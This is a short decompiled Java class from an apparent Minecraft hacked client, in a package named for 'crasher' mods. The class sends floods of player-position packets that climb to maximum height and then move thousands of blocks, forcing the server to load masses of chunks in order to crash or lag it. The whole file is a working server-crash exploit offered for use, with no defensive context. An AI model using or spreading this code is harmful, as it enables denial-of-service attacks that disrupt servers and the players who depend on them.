// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.mclc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.client.Minecraft;

public class MassChunkLoadCrasher1
{
    public static void start() {
        for (double i2 = Minecraft.getMinecraft().player.posY; i2 < 255.0; i2 += 5.0) {
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.getMinecraft().player.posX, i2, Minecraft.getMinecraft().player.posZ, true));
        }
        for (int i3 = 0; i3 < 6685; i3 += 5) {
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.getMinecraft().player.posX + i3, 255.0, Minecraft.getMinecraft().player.posZ + i3, true));
        }
    }
}
